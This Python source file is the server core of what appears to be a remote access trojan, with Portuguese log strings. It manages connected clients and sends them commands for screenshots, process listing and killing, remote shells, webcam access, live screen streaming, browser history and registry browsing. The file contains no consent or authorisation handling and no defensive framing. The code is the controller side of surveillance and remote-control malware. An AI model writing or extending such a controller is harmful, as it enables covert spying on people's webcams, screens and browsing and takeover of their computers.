# server/core/socket_server.py
import socket
import logging
import time
from core.connection_manager import ConnectionManager
from core.client_manager import ClientManager
from core.command_processor import CommandProcessor
from handlers.screenshot_handler import ScreenshotHandler
from handlers.process_handler import ProcessHandler
from core.protocol import *
logger = logging.getLogger("socket_server")
class SocketServer:
    def __init__(self):
        self.is_running = False
        self.server_socket = None
        self.connection_manager = ConnectionManager(self)
        self.client_manager = ClientManager(self)
        self.command_processor = CommandProcessor(self)
        self.screenshot_handler = ScreenshotHandler(self)
        self.process_handler = ProcessHandler(self)
        self.log_callback = None
        self.update_ui_callback = None
        self.screenshot_callback = None
        self.process_list_callback = None
        self.shell_response_callback = None
        self.file_response_callback = None
        self.webcam_response_callback = None
        self.window_manager = None
    def set_callbacks(self, log_callback, update_ui_callback, screenshot_callback=None, 
                    process_list_callback=None, shell_response_callback=None,
                    file_response_callback=None, webcam_response_callback=None,
                    screen_stream_callback=None):
        self.log_callback = log_callback
        self.update_ui_callback = update_ui_callback
        self.screenshot_callback = screenshot_callback
        self.process_list_callback = process_list_callback
        self.shell_response_callback = shell_response_callback
        self.file_response_callback = file_response_callback
        self.webcam_response_callback = webcam_response_callback
        self.screen_stream_callback = screen_stream_callback
    def set_file_response_callback(self, callback):
        self.file_response_callback = callback
    def set_window_manager(self, window_manager):
        self.window_manager = window_manager
    def log(self, message):
        if self.log_callback:
            self.log_callback(message)
        else:
            logger.info(message)
    def start(self, host, port):
        if self.is_running:
            self.log("O servidor já está em execução")
            return False
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((host, port))
            self.server_socket.listen(5)
            self.is_running = True
            self.log(f"Servidor iniciado em {host}:{port}")
            self.connection_manager.start_accept_thread()
            return True
        except Exception as e:
            self.log(f"ERRO ao iniciar servidor: {str(e)}")
            if self.server_socket:
                try:
                    self.server_socket.close()
                except:
                    pass
                self.server_socket = None
            return False
    def stop(self):
        if not self.is_running:
            self.log("O servidor não está em execução")
            return
        self.log("Parando o servidor...")
        self.is_running = False
        self.connection_manager.disconnect_all_clients()
        time.sleep(0.3)
        self.connection_manager.clear_all_clients()
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception as e:
                self.log(f"Erro ao fechar socket do servidor: {str(e)}")
        self.log("Servidor encerrado")
        if self.update_ui_callback:
            self.update_ui_callback()
    def send_command(self, client_address, command_data):
        return self.command_processor.send_command(client_address, command_data)
    def request_process_list(self, client_address, detailed=False):
        return self.process_handler.request_process_list(client_address, detailed)
    def request_kill_process(self, client_address, pid):
        return self.process_handler.request_kill_process(client_address, pid)
    def get_client_count(self):
        return self.connection_manager.get_client_count()
    def get_clients(self):
        return self.connection_manager.get_clients()
    def open_shell(self, client_address):
        if hasattr(self, 'window_manager') and self.window_manager:
            return self.window_manager.open_shell_window(client_address)
        return None
    def process_webcam_response(self, client_address, cmd, data):
        if hasattr(self, 'window_manager') and self.window_manager:
            try:
                self.window_manager.process_webcam_response(client_address, cmd, data)
                return True
            except Exception as e:
                self.log(f"Erro ao processar resposta de webcam via window_manager: {str(e)}")
        if hasattr(self, 'webcam_response_callback') and self.webcam_response_callback:
            try:
                self.webcam_response_callback(client_address, cmd, data)
                return True
            except Exception as e:
                self.log(f"Erro ao processar resposta de webcam via callback: {str(e)}")
        self.log(f"Nenhum handler disponível para processar resposta de webcam")
        return False
    def request_webcam_list(self, client_address):
        if client_address not in self.connection_manager.client_handlers:
            self.log(f"Cliente não encontrado: {client_address}")
            return False
        client_handler = self.connection_manager.client_handlers[client_address]
        self.log(f"Solicitando lista de webcams de {client_address}")
        return client_handler._send_binary_command(CMD_WEBCAM_LIST)
    def open_webcam(self, client_address):
        if hasattr(self, 'window_manager') and self.window_manager:
            return self.window_manager.open_webcam_window(client_address)
        return None
    def process_screen_stream_frame(self, client_address, data):
        try:
            if hasattr(self, 'window_manager') and self.window_manager:
                try:
                    self.window_manager.process_screen_stream_frame(client_address, data)
                    return True
                except Exception as e:
                    self.log(f"Erro ao processar frame de stream de tela via window_manager: {str(e)}")
            if hasattr(self, 'screen_stream_callback') and self.screen_stream_callback:
                try:
                    self.screen_stream_callback(client_address, data)
                    return True
                except Exception as e:
                    self.log(f"Erro ao processar frame de stream de tela via callback: {str(e)}")
            self.log(f"Nenhum handler disponível para processar frame de stream de tela")
            return False
        except Exception as e:
            self.log(f"Erro ao processar frame de stream de tela: {str(e)}")
            return False
    def open_screen_stream(self, client_address):
        if hasattr(self, 'window_manager') and self.window_manager:
            return self.window_manager.open_screen_stream_window(client_address)
        return None
    def process_screen_stream_response(self, client_address, cmd, data):
        client_key = f"{client_address[0]}:{client_address[1]}"
        self.log(f"Processando resposta de stream de tela ({cmd}) para {client_key}")
        try:
            if hasattr(self, 'window_manager') and self.window_manager:
                try:
                    self.window_manager.process_screen_stream_response(client_address, cmd, data)
                    return True
                except Exception as e:
                    self.log(f"Erro ao processar resposta de stream de tela via window_manager: {str(e)}")
            if hasattr(self, 'screen_stream_callback') and self.screen_stream_callback:
                try:
                    self.screen_stream_callback(client_address, cmd, data)
                    return True
                except Exception as e:
                    self.log(f"Erro ao processar resposta de stream de tela via callback: {str(e)}")
            self.log(f"Nenhum handler disponível para processar resposta de stream de tela")
            return False
        except Exception as e:
            self.log(f"Erro ao processar resposta de stream de tela: {str(e)}")
            return False
    def open_browser_history(self, client_address):
        if hasattr(self, 'window_manager') and self.window_manager:
            return self.window_manager.open_browser_history_window(client_address)
        return None
    def open_registry_window(self, client_address):
        if hasattr(self, 'window_manager') and self.window_manager:
            return self.window_manager.open_registry_window(client_address)
        return None
